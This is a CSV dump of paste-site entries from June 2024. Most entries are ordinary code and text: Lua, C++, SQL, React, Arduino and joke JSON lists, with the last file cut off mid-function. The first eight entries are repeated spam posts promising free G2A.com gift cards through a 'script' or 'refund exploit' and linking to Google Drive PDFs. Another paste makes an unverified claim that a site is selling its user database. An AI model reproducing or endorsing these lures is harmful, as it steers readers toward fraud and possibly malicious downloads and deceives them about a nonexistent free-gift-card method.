id,title,username,language,date,content
JwY0B996,🤑G2A.com Free Gift Card FIX June 2024🤑,ColtM4A2,JavaScript,Friday 28th of June 2024 06:44:57 AM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24th 2024

"
Y7H1h6Su,🎁 G2A.COM FREE GIFT CARD GUIDE JUN 2024V4 🎁,jusst2k4,GetText,Friday 28th of June 2024 06:40:45 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_282682.pdf
 
Working as of:
28 June 2024"
T5307giK,🤑G2A.com Free Gift Card FIX June 2024🤑,Skarface-MKL,JavaScript,Friday 28th of June 2024 06:38:54 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any gift card for free on G2A.com including Playstation gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24 2024

"
jgqLEh0w,🤑G2A.com Free Gift Card FIX June 2024🎁,thepplayz,JavaScript,Friday 28th of June 2024 06:32:52 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any gift card for free on G2A.com including Xbox gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24 2024

"
YULT69g5,🤑G2A.com Free Gift Card FIX June 2024🤑,sirmikey,JavaScript,Friday 28th of June 2024 06:26:49 AM CDT,"G2A.com complimentary gift card & games guide.
Any voucher for free on G2A.com including Xbox gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24 2024

"
V6WKXsuW,🤑G2A.com Free Gift Card FIX June 2024🤑,sayid83,JavaScript,Friday 28th of June 2024 06:20:45 AM CDT,"G2A.com free voucher & games guide.
Any voucher for free on G2A.com including Amazon gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
RgJwykjw,🤑G2A.com Free Gift Card FIX June 2024🎁,PetrikDev,JavaScript,Friday 28th of June 2024 06:14:42 AM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Amazon gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
aixbxByg,🤑G2A.com Free Gift Card FIX June 2024🤑,x3kiN,JavaScript,Friday 28th of June 2024 06:08:35 AM CDT,"G2A.com free voucher & gaming guide.
Any item for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
TzJWVv0r,must,Nil000,Email,Friday 28th of June 2024 06:07:48 AM CDT,"myip.ms is selling their entire database (over 100 million entries) on twitter

their account: @myipms"
364DCNPw,data971,TestGuy1,JSON,Friday 28th of June 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '7915154cda3cb11697e324c26bc654b4eaf883e2a588fcab3f7c48fc1988bb473f2c810b2a3b520795a605c2fc08fa9756e9546a79e8ba3b362e308e1a65e28f2a9558afc5ee7f91a1c1de224c1ba6d4047e817998444477c039c9ef577bee73f4eaaa26b23ef81427c284fc2174e075f66448a4e03d7d5e6c05db31291b0ff6',
  otherdata: [
    '3ba1b940cac87030e40d2197f4a27c81',
    '7a69b1fdcbbe5250fedd5187a72413e5',
    '5be09727362eb61798e29329eda71115',
    'a100445f6f3131c872f6e14d1440b31b',
    '16ab81b5f21a3230aec272ef4936ff51',
    'd9381ad858d1ce2417e43844bdacc9a0',
    '4e0531963e0622d3ffc538782b87c318',
    '617ce6e7d2a6f8e3f6ea975c52498fb0'
  ]
}"
MUvU3gXu,Untitled,mfemtsuccess,JSON,Friday 28th of June 2024 05:59:55 AM CDT,"دليلك الكامل لحجز فنادق مكة لشهر رمضان : أسعار، عروض، وتجارب مُميزة

مما لا شك فيه أن حجز فنادق مكة لشهر رمضان المبارك هو أحد أهم وأثمن الأوقات لدى المسلمين حول العالم، حيث يمثل فرصة عظيمة للتقرب إلى الله عبر الصيام والعبادة. وإذا كنت تفكر في زيارة مكة خلال هذا الشهر الفضيل، فإنك تسعى بالتأكيد لتجربة روحية لا تُضاهى. لكن السؤال الأكبر الذي يدور في ذهن الجميع هو: كيف يمكنني الحصول على أفضل تجربة إقامة في مكة خلال شهر رمضان؟ هل هناك طرق ذكية يمكنني من خلالها توفير المال بينما أحصل على أفضل الخدمات؟ يُنصح بالبحث عن فنادق مكة في رمضان وقراءة التقييمات.
 لمعرفة المزيد :  https://alkawtherhotel.com/mecca-hotels-for-ramadan/
"
XdK5edwZ,tourister.ru - 12 смартов,Luxup,HTML,Friday 28th of June 2024 05:35:23 AM CDT,"<!-- head -->
<script async type=""text/javascript"" src=""//s.luxcdn.com/t/221368/360_light.js""></script>

<!-- 1 of 12-->
<div id='lx_717549_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717549_wrapper', '_221368', '_717549');});
</script>
</div>

<!-- 2 of 12-->
<div id='lx_717548_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717548_wrapper', '_221368', '_717548');});
</script>
</div>

<!-- 3 of 12-->
<div id='lx_717555_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717555_wrapper', '_221368', '_717555');});
</script>
</div>

<!-- 4 of 12-->
<div id='lx_717554_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717554_wrapper', '_221368', '_717554');});
</script>
</div>

<!-- 5 of 12-->
<div id='lx_717553_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717553_wrapper', '_221368', '_717553');});
</script>
</div>

<!-- 6 of 12-->
<div id='lx_717552_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717552_wrapper', '_221368', '_717552');});
</script>
</div>

<!-- 7 of 12-->
<div id='lx_717559_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717559_wrapper', '_221368', '_717559');});
</script>
</div>

<!-- 8 of 12-->
<div id='lx_717558_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717558_wrapper', '_221368', '_717558');});
</script>
</div>

<!-- 9 of 12-->
<div id='lx_717557_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717557_wrapper', '_221368', '_717557');});
</script>
</div>

<!-- 10 of 12-->
<div id='lx_717556_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717556_wrapper', '_221368', '_717556');});
</script>
</div>

<!-- 11 of 12-->
<div id='lx_717563_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717563_wrapper', '_221368', '_717563');});
</script>
</div>

<!-- 12 of 12-->
<div id='lx_717562_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717562_wrapper', '_221368', '_717562');});
</script>
</div>"
Ub2qxxYD,chopping tree v3,tommy2805,Lua,Friday 28th of June 2024 05:05:52 AM CDT,"local filename = ""homePoint.txt"" --file cordinate home point
local homePoint

-- Funzione per leggere la prima riga
local function readHomePoint(filename)
    local file = fs.open(filename, ""r"")
    local firstLine = file.readLine()
    file.close()
    return firstLine
end


if fs.exists(filename) then
    homePoint = vector.new(readHomePoint(filename))
    print(""Homepoint: "" .. tostring(homePoint))
else
    local file = fs.open(filename, ""w"")
    local home = vector.new(gps.locate(5))
    if home then
        file.writeLine(home)
        file.close()
        print(""Home point saved in "" .. filename)
        homePoint = home
        turtle.forward()
        turtle.turnRight()
        turtle.forward()
        print(""new pos ="" .. tostring(vector.new(gps.locate(5))))
        
    else
        print(""Not able to get home point shutting down..."")
        sleep(2)
        os.shutdown()
    end
end
"
kW4Ep46T,TileGetPixel,cepxuozab,C++,Friday 28th of June 2024 03:42:59 AM CDT,"void CheckTileFill(const Tile &tile, char color){
        for (auto i = 0; i < Tile::SIZE; ++i){
            for (auto j = 0; j < Tile::SIZE; ++j){
                PRACTIKUM_ASSERT_EQUAL(tile.GetPixel({i, j}), color);
            }
        }
    }

void TileGetPixel(){
        const char color = '#';
        const Tile tile(color);
        CheckTileFill(tile, color);
        ASSERT_EQUAL(tile.GetPixel({Tile::SIZE, Tile::SIZE}), ' ');
        ASSERT_EQUAL(tile.GetPixel({Tile::SIZE + 1, Tile::SIZE}), ' ');
        ASSERT_EQUAL(tile.GetPixel({Tile::SIZE, Tile::SIZE + 1}), ' ');
        ASSERT_EQUAL(tile.GetPixel({Tile::SIZE + 100, Tile::SIZE + 10}), ' ');
        ASSERT_EQUAL(tile.GetPixel({-1, 1}), ' ');
        ASSERT_EQUAL(tile.GetPixel({1, -1}), ' ');
        ASSERT_EQUAL(tile.GetPixel({-1, -1}), ' ');
    }"
KLKwhjiG,battle list,frzyc,JSON,Friday 28th of June 2024 03:30:55 AM CDT,"[
	""Null Pointer Jab"",
	""Syntax Slam"",
	""Runtime Error Rush"",
	""Segmentation Fault Strike"",
	""Infinite Loop Lunge"",
	""Buffer Overflow Bash"",
	""Recursion Rumble"",
	""Compile Time Crush"",
	""Logic Bomb Burst"",
	""Garbage Collection Grab"",
	""Variable Shadow Sneak"",
	""Exception Throw"",
	""Memory Leak Lash"",
	""Stack Overflow Smash"",
	""Bitwise Blow"",
	""Deadlock Drop"",
	""Heisenbug Hammer"",
	""Data Race Dash"",
	""Algorithm Assault"",
	""Thread Lock Thrust""
]"
T4904DUv,Untitled,ma39isy,Oracle 11,Friday 28th of June 2024 03:16:30 AM CDT,"SELECT DISTINCT
    A.studyprogramid,
	A.studyprogramname,
	A.FACULTYID,
	fac.FACULTYNAME,
	org.orgstructureid,
	org.orgstructurename,
	em.employeeid,
	em.fullname
FROM
	masterdata.studyprogram A
JOIN masterdata.relation B ON
	( A.studyprogramid = secondid
		AND secondtable = 'STUDYPROGRAM' )
JOIN masterdata.organizationstructure org ON
	( firstid = org.orgstructureid
		AND firsttable = 'ORGANIZATIONSTRUCTURE' )
JOIN masterdata.employeemaster em ON
	( org.orgstructureid = em.worklocation )
JOIN FRAMEWORK1.USERS us ON
	(us.username = em.employeeid)
JOIN FACULTIES fac ON
	(fac.facultyid = A.facultyid)
WHERE
	us.userid = '171806'
	AND B.activestatus = 'Y'
	AND em.activestatus = 'Y'
	AND org.active = 'Y'"
JrCX4GSM,slap array,frzyc,JSON,Friday 28th of June 2024 03:10:33 AM CDT,"[
	""a Null reference exception."",
	""a cat shaped abacus."",
	""a clacky mechanical keyboard."",
	""a catgirl booba mousepad!?!"",
	""a rubber duck (for debugging purposes)."",
	""a phonebook-size printout of unread API documentation."",
	""a 404 Not Found?"",
	""a Cloudflare bill of 120k."",
	""a polyfill.io vulnerability."",
	""a diamond pixelated sword."",
	""a giant HTML closing tag."",
	""a giant compiler error message."",
	""a over-sized \""if-else\"" statement."",
]"
X1Z8LSx8,123,hpnq,C++,Friday 28th of June 2024 03:00:41 AM CDT,"#include <iostream>
#include <iomanip>
#include <fstream>
#include <string.h>
#include <windows.h>
using namespace std;


struct Countries {
    string name; //название страны
    string capital; //столица
    double population; //численность населения
    double populationPercent; //процент населения от общемирового
    double area; //площадь
};


struct node {
    Countries countries;
    node* left, * right;
};


//очередь
struct qnode {
    Countries info;
    qnode* next;
};


//добавляем элемент в очередь
void push(qnode** start, qnode** end, Countries& d) {
    qnode* p = new qnode;
    p->info = d;
    p->next = nullptr;
    if (*end) {
        (*end)->next = p;
    }
    else {
        (*start) = p;
    }
    *end = p;
}

void inputcountries(Countries& countries)//ввод данных о студенте
{
    cout << ""Info aboit one country"" << endl;
//    cout << ""Введите название страны: "" << endl;
    cin >> countries.name;
//    cout << ""Введите столицу:"" << endl;
    cin >> countries.capital;
//    cout << ""Введите численность населения:"" << endl;
    cin >> countries.population;
//    cout << ""Введите процент населения от общемирового:"" << endl;
    cin >> countries.populationPercent;
//    cout << ""Введите площадь:"" << endl;
    cin >> countries.area;

}


//ввод массива с клавиатуры
void inputMasFromKeyboard(qnode*& s, qnode*& e, unsigned int& size)
{
    cout << ""size"" << endl;
    cin >> size;
    if (size == 0) return;
    int i;
    for (i = 0; i < size; i++)
    {

        cout << ""info:"" << endl;
        Countries cs;
        inputcountries(cs);
        push(&s, &e, cs);
//        s = s->next;
    }
}

void printStudent(Countries countries)//печать данных о стране
{
    cout << left << setw(10) << countries.name << setw(15) << countries.capital << setw(10) << countries.population << setw(9)
         << countries.populationPercent << setw(5) << countries.area << endl;;

}

void printMas(qnode* q1, unsigned int size)
{
    if (!size) return;
    cout << ""our country array:"" << endl;
    cout << left << setw(10) << ""a"" << setw(15) << ""b"" << setw(10) << ""c"" << setw(9)
         << ""d"" << setw(5) << ""e"" << endl;
    for (int i = 0; i < size; i++)
    {
        printStudent(q1->info);
        q1 = q1->next;
    }
}


void insert(node** p, Countries countries) // добавление узла в дерево поиска
{
    if (*p == NULL)
    { //создаём новый узел дерева на найденном месте
        *p = new node;
        (*p)->countries = countries;
        (*p)->left = NULL;
        (*p)->right = NULL;
    }
    else
    {
        if (countries.name < (*p)->countries.name) insert(&(*p)->left, countries);
        if (countries.name > (*p)->countries.name) insert(&(*p)->right, countries);
    }
}


// распечатка дерева в симметричном порядке
void printsim(const node* p)
{
    if (p != NULL)
    {
        printsim(p->left);
        printStudent(p->countries);
        printsim(p->right);
    }
}
void clear(node** p) // очистка дерева
{
    if ((*p) != NULL)
    {
        clear(&(*p)->left);
        clear(&(*p)->right);
        delete* p;
        *p = NULL;
    }
}


//функция создания деревьев из массива
void createTrees(qnode* q1, unsigned int size, node** root1, node** root2)
{
    if (!size) return;
    for (int i = 0; i < size; i++)
    {
        if (q1->info.population > 100000000) insert(root1, q1->info);
        else insert(root2, q1->info);
        q1 = q1->next;
    }
}



// высота дерева
int height(const node* p)
{
    if (p == NULL) return 0;
    int h1 = height(p->left);//считаем высоту левого поддерева
    int h2 = height(p->right);//считаем высоту правого поддерева
    if (h1 >= h2) return h1 + 1;//возвращаем высоту большего из них+1 - так как добавляем наш узел
    return h2 + 1;
}





double sayminarea(const node* p) {
    if (p != NULL)
    {

        double s1 = sayminarea(p->left); // печатаем левое поддерево
        double s2 = sayminarea(p->right); // печатаем правое поддерево
        return min(p->countries.area, min(s1, s2)); // минимальная площадь поддеревьев.
    }

    return 100000000; //
}
int saymaxlevel(const node* p, string s) {
    //height

    if (p != NULL)
    {

        int s1 = saymaxlevel(p->left, s); // печатаем левое поддерево
        int s2 = saymaxlevel(p->right, s); // печатаем правое поддерево
        if (p->countries.name[0] == s[0]) {
            return max(height(p), max(s1, s2)); // минимальная площадь поддеревьев
        }
        return max(s1, s2);
    }
    return 0;

}

// очистка очереди
void clear(qnode** pbeg)
{
    qnode* temp;
    while (*pbeg != nullptr)
    {
        temp = (*pbeg)->next; //устанавливаем temp на следующий узел
        delete* pbeg; // удаляем текущий узел
        *pbeg = temp; // устанавливаем указатель начала pbeg на temp
    }
}

int main() {
    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);
    unsigned int size = 0;
    qnode* s1 = NULL, * e1 = NULL;
    inputMasFromKeyboard(s1, e1, size);

    if (size) {

        node* root1 = NULL, * root2 = NULL;
        printMas(s1, size);
        cout << endl;

        createTrees(s1, size, &root1, &root2);

        cout << ""first in simm"" << endl;
        printsim(root1);
        cout << endl;
        cout << ""second in simm"" << endl;
        printsim(root2);
        cout << endl;
        // ------------ задача 5--------------

        cout << ""min array from 1 tree: "" << endl;
        sayminarea(root1);
        // ------------ задача 6--------------
        string s;
        cout << ""insert letter  "" << endl;
        cin >> s;
        cout << ""max level from 2 tree:  "" << endl;
        cout << saymaxlevel(root2, s) << endl;


        // ------------ задача 7--------------

        clear(&root1);
        if (!root1) cout << ""cleared!"" << endl;
        clear(&root2);
        if (!root2) cout << ""cleared!"" << endl;


        clear(&s1);
    }
    else cout << ""Размер массива равен 0"" << endl;
    return 0;
}
/*
 *
 *
 *
 *
 rsssia    m1skow         1.488e+081.94     1705.2rsssia    m1skow         1.488e+081.94     1705.2

 */"
qmr1yt05,Edit product page,riste5,JavaScript,Friday 28th of June 2024 02:44:39 AM CDT,"import { useCallback, useEffect, useState } from ""react"";
import { SetFieldError, ClearFieldError, ValidateBBCode } from ""@/Components/CoreFunctionsComponent.jsx"";
import { Head, Link, router } from ""@inertiajs/react"";
import { MyEcommerceNavigation } from ""@/Components/NavigationComponent.jsx"";
import { Toggler } from ""@/Components/Toggler.jsx"";
import MyEcommerceDropdownLinks from ""@/Components/DropdownComponent.jsx"";

export default function EditProduct(props) {
  const [data, setData] = useState(null);
  const [websiteData, setWebsitedata] = useState(null);
  const [loadingState, setLoadingstate] = useState({
    product: true,
    meta: true,
    attachment: true,
    coupon: true,
    avatar: true,
    user: true,
  });
  const [userDetails, setUserDetails] = useState(null);
  const [productLogo, setProductLogo] = useState(null);
  const [categories, setCategories] = useState(null);
  useEffect(() => {
    async function getWebsiteData() {
      const meta = await axios.post(""/admin/website_settings"");
      if (meta.data) {
        const d = meta.data;
        setWebsitedata(d);
        setLoadingstate((prev) => ({ ...prev, meta: false }));
        return true;
      }
      return false;
    }
    async function getUser() {
      const user = await axios.post(""/admin/user"");
      if (user.data) {
        setUserDetails(user.data);
        setLoadingstate((prev) => ({ ...prev, user: false }));
        return true;
      }
      return false;
    }
    async function getProduct() {
      const response = await axios.post(""/admin/product"", JSON.stringify({ id: parseInt(props.id) }), {
        headers: {
          ""Content-Type"": ""application/json"",
        },
      });
      if (response) {
        const product = response.data.product,
          logo = response.data.logo;
        setData((prev) => product);
        setLoadingstate((prev) => ({ ...prev, product: false }));
        setProductLogo((prev) => logo);
        setCategories((prev) => response.data.categories);
        return true;
      }
      return false;
    }
    getWebsiteData();
    getUser();
    getProduct();
  }, []);
  return (
    <>
      <Head>
        <title>{loadingState.meta && !websiteData ? ""Loading..."" : websiteData.website_name}</title>
      </Head>
      {loadingState.user || loadingState.meta ? (
        <>
          <div className=""p-header flex flex-col w-[100%] items-center"">
            <div className=""flex w-[100%] flex-row justify-center flex-wrap items-center content-center"">
              <div className=""loader""></div>
            </div>
          </div>
          <aside className=""sm:hidden max-sm:hidden md:hidden sidebar-sm"" id=""sidebarSM"">
            <div className=""sidebar-container"">
              <div className=""loader""></div>
            </div>
          </aside>
        </>
      ) : (
        <>
          <MyEcommerceNavigation user={userDetails} website={websiteData} userAvatar={userDetails.avatar_img} />
        </>
      )}
      <div className=""p-body m-t-4"">
        <div className=""p-body-inner"">
          <div className=""flex flex-col w-[100%] flex-wrap items-baseline"">
            <h1 className=""text-sm font-bold text-neutral-300"">
              {loadingState.meta ? ""Loading..."" : websiteData.website_name}
            </h1>
            <div className=""flex flex-col w-[100%] flex-wrap items-baseline bg-neutral-800"">
              {loadingState.product ? (
                <>
                  <div className=""flex w-[100%] flex-wrap justify-center"">
                    <div className=""loader""></div>
                  </div>
                </>
              ) : (
                <>
                  <div className=""flex flex-col w-[100%] p-5 items-baseline bg-neutral-800 flex-wrap"">
                    <div className=""flex w-[100%] flex-wrap"">
                      <Link href=""#"" className=""button button--default w-[100%] text-center"">
                        Product Releases
                      </Link>
                    </div>
                    <div className=""flex w-[100%] flex-wrap m-t-1"">
                      <Link href=""#"" className=""button p-5 w-[100%] text-center bg-red-950"">
                        Delete this product
                      </Link>
                    </div>
                  </div>
                </>
              )}
            </div>
            <div className=""flex flex-col w-[100%] flex-wrap items-baseline m-t-1 block bg-dark"">
              {loadingState.product ? (
                <>
                  <div className=""flex w-[100%] flex-wrap justify-center"">
                    <div className=""loader""></div>
                  </div>
                </>
              ) : null}
              {data ? (
                <>
                  <div className=""block-container"">
                    <div className=""block-header"">
                      <h2 className=""text-sm font-bold text-neutral-300"">{data.product_name}</h2>
                    </div>
                    <div className=""block-body"">
                      <div className=""flex w-[100%] flex-col flex-wrap justify-center items-center p-5 bg-neutral-800"">
                        <div className=""product-logo"">
                          <img src={productLogo} alt={data.product_name + ""`s Logo""} />
                        </div>
                        <button type=""button"" className=""button button--default text-center"">
                          Upload Logo
                        </button>
                      </div>
                      <form className=""flex w-[100%] flex-wrap flex-col items-baseline"">
                        <div className=""control-group"">
                          <label htmlFor=""product_name"">Product name:</label>
                          <div className=""control-input"">
                            <input
                              id=""product_name""
                              type=""text""
                              name=""product_name""
                              className=""formInput""
                              defaultValue={data.product_name}
                            />
                            <span className=""error-text""></span>
                          </div>
                        </div>
                        <div className=""control-group"">
                          <label htmlFor=""product_description"">Product description:</label>
                          <div className=""control-input"">
                            <textarea
                              name=""product_description""
                              id=""product_description""
                              className=""formInput""
                              defaultValue={data.product_description}
                            ></textarea>
                            <span className=""error-text""></span>
                          </div>
                        </div>
                        <div className=""control-group"">
                          <label htmlFor=""version_string"">Version string</label>
                          <div className=""control-input"">
                            <input
                              type=""text""
                              name=""version_string""
                              className=""formInput""
                              id=""version_string""
                              defaultValue={data.version_string}
                            />
                            <span className=""error-text""></span>
                          </div>
                        </div>
                        <div className=""control-group"">
                          <label htmlFor=""version_id"">Version ID</label>
                          <div className=""control-input"">
                            <input
                              type=""number""
                              name=""version_id""
                              className=""formInput""
                              id=""version_id""
                              defaultValue={data.version_id}
                            />
                            <span className=""error-text""></span>
                          </div>
                        </div>
                        <div className=""control-group"">
                          <label htmlFor=""version_changelog"">Version changelog</label>
                          <div className=""control-input"">
                            <textarea
                              name=""version_changelog""
                              className=""formInput""
                              id=""version_changelog""
                              defaultValue={data.version_changelog}
                            />
                            <span className=""error-text""></span>
                          </div>
                        </div>
                        <div className=""control-group"">
                          <label htmlFor=""product_price"">Product price</label>
                          <div className=""control-input"">
                            <input
                              type=""number""
                              step={0.01}
                              name=""product_price""
                              className=""formInput""
                              id=""product_price""
                              defaultValue={data.product_price}
                            />
                            <span className=""error-text""></span>
                          </div>
                        </div>
                        <div className=""control-group"">
                          <label htmlFor=""category_id"">Category</label>
                          <div className=""control-input"">
                            <select name=""category_id"" id=""category_id"" className=""formInput"">
                              {Object.keys(categories).map((k) => (
                                <>
                                  <option
                                    value={categories[k].category_id}
                                    defaultChecked={categories[k].category_id === data.category_id ? true : false}
                                  >
                                    {categories[k].category_title}
                                  </option>
                                </>
                              ))}
                            </select>
                          </div>
                        </div>
                      </form>
                    </div>
                  </div>
                </>
              ) : null}
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
"
LdgRDtwu,TaskManager.h,bipping,C,Friday 28th of June 2024 02:30:48 AM CDT,"#ifndef C__USERS_BIPPI_ONEDRIVE_DOCUMENTS_ARDUINO_STEPMOTORV3_4_STEPMOTORV3_4_INO_STEPMOTORV3_4_TASKMANAGER_H_
#define C__USERS_BIPPI_ONEDRIVE_DOCUMENTS_ARDUINO_STEPMOTORV3_4_STEPMOTORV3_4_INO_STEPMOTORV3_4_TASKMANAGER_H_

// Copyright [2024] <Bipping>

#include <avr/sleep.h>
#include <avr/power.h>
#include <avr/interrupt.h>

#define MAX_TASKS 10
const uint32_t DEFAULT_MARGIN = 288;

uint8_t taskCount;
volatile uint8_t isrCounter;
volatile uint8_t remainingMicros;
uint32_t margin;

typedef void (*TaskFunction)(void);

struct Task {
    TaskFunction callback;
    uint32_t interval;
    uint32_t lastRun;
};

// Enum for sleep modes
enum SleepMode {
    IDLE_MODE,
    POWER_SAVE_MODE,
    EXTENDED_STANDBY_MODE
};


Task tasks[MAX_TASKS];

void addTask(TaskFunction callback, uint32_t interval);
void removeTask(TaskFunction callback);
void changeTaskInterval(TaskFunction callback, uint32_t newInterval);
void setSleepMode(SleepMode mode);
void updateTasks();

#endif  // C__USERS_BIPPI_ONEDRIVE_DOCUMENTS_ARDUINO_STEPMOTORV3_4_STEPMOTORV3_4_INO_STEPMOTORV3_4_TASKMANAGER_H_
"
6eut0wVF,TaskManager,bipping,C++,Friday 28th of June 2024 02:27:52 AM CDT,"#include ""TaskManager.h""
#include <Arduino.h>

// Copyright [2024] <Bipping>

#define MAX_TASKS 10
const uint32_t DEFAULT_MARGIN = 288;

uint32_t margin = DEFAULT_MARGIN;

// Utilisation des types spécifiques pour optimiser la mémoire
typedef struct {
    TaskFunction callback;
    uint32_t interval;
    uint32_t lastRun;
} Task;

Task tasks[MAX_TASKS];
uint8_t taskCount = 0;
volatile uint8_t isrCounter = 0;
volatile uint8_t remainingMicros = 0;

void addTask(TaskFunction callback, uint32_t interval) {
    if (taskCount < MAX_TASKS) {
        tasks[taskCount] = {callback, interval, micros()};
        taskCount++;
    }
}

void removeTask(TaskFunction callback) {
    for (int i = 0; i < taskCount; i++) {
        if (tasks[i].callback == callback) {
            for (int j = i; j < taskCount - 1; j++) {
                tasks[j] = tasks[j + 1];
            }
            taskCount--;
            break;
        }
    }
}

void changeTaskInterval(TaskFunction callback, uint32_t newInterval) {
    for (int i = 0; i < taskCount; i++) {
        if (tasks[i].callback == callback) {
            tasks[i].interval = newInterval;
            break;
        }
    }
}

void setSleepMode(SleepMode mode) {
    switch (mode) {
        case IDLE_MODE:
            set_sleep_mode(SLEEP_MODE_IDLE);
            break;
        case POWER_SAVE_MODE:
            set_sleep_mode(SLEEP_MODE_PWR_SAVE);
            break;
        case EXTENDED_STANDBY_MODE:
            set_sleep_mode(SLEEP_MODE_EXT_STANDBY);
            break;
        default:
            set_sleep_mode(SLEEP_MODE_IDLE);
            break;
    }
}

void updateTasks() {
    uint32_t currentTime = micros();
    uint32_t nextTime = UINT32_MAX;
    Task *taskQueue[MAX_TASKS];
    uint8_t taskQueueCount = 0;
    Task *indexFonction = nullptr;
    bool executeImmediately = false;

    for (int i = 0; i < taskCount; i++) {
        uint32_t scheduledTime = tasks[i].lastRun + tasks[i].interval;
        if (scheduledTime <= currentTime) {
            taskQueue[taskQueueCount++] = &tasks[i];
            executeImmediately = true;
        } else if (scheduledTime < nextTime && !executeImmediately) {
            nextTime = scheduledTime;
            indexFonction = &tasks[i];
        }
    }

    if (executeImmediately) {
        currentTime = micros();
        for (int i = 0; i < taskQueueCount; i++) {
            taskQueue[i]->callback();
            taskQueue[i]->lastRun = currentTime;
            // Fin de updateTask
        }
    } else {
        currentTime = micros();
        uint32_t timeToNextTask = nextTime > currentTime ? nextTime - currentTime : 0;

        if (timeToNextTask > margin) {
            uint16_t prescalerBits;
            uint32_t intervalMicros = timeToNextTask - margin;
            int8_t shifts;

            if (intervalMicros > 237856) {
                prescalerBits = 0x07;  // Prescaler 1024
                shifts = -6;
            } else if (intervalMicros > 113338) {
                prescalerBits = 0x06;  // Prescaler 256
                shifts = -4;
            } else if (intervalMicros > 51078) {
                prescalerBits = 0x05;  // Prescaler 128
                shifts = -3;
            } else if (intervalMicros > 19949) {
                prescalerBits = 0x04;  // Prescaler 64
                shifts = -2;
            } else if (intervalMicros > 4384) {
                prescalerBits = 0x03;  // Prescaler 32
                shifts = -1;
            } else if (intervalMicros > 288) {
                prescalerBits = 0x02;  // Prescaler 8
                shifts = 1;
            } else {
                prescalerBits = 0x01;  // Prescaler 1
                shifts = 4;
            }

            if (shifts < 0) {
                uint8_t mask = (1UL << -shifts) - 1;
                uint8_t lostBits = intervalMicros & mask;
            }

            uint32_t clockCycles = (shifts > 0) ? (intervalMicros << shifts) : (intervalMicros >> -shifts);
            isrCounter = clockCycles >> 8;
            uint32_t remainingCycles = clockCycles & 0xFF;

            if (remainingCycles > 0) {
                remainingMicros = remainingCycles - 1
                isrCounter++;
            } else {
                remainingMicros = 0;
            }

            OCR2A = isrCounter > 1 ? 0xFF : remainingMicros;
            TCCR2B = (TCCR2B & 0b11111000) | prescalerBits;

            TIMSK2 |= (1 << OCIE2A);  // Enable Timer2 Compare Match A interrupt
            TCCR2B |= (1 << CS22);  // Start Timer
            sleep_enable();
            sleep_cpu();
            // Au réveil

            TCCR2B &= ~(1 << CS22);  // Stop Timer
